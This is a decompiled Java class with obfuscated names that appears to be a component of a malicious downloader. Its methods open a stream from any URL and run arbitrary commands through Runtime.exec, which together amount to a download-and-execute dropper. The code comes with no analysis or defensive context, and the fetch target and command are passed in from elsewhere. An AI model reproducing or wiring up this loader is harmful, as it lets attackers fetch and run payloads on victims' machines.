import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sikol
{
    public static InputStream Ewsgh(final String sdhds) throws Exception {
        final URL dfy = new URL(sdhds);
        try {
            dfy.openConnection();
        }
        catch (Exception ex) {}
        return dfy.openStream();
    }
    
    public static Runtime Egssa() {
        return Runtime.getRuntime();
    }
    
    public static void Wefmi(final String fn) throws Exception {
        final Process wsff = Egssa().exec(fn);
        wsff.waitFor();
    }
}
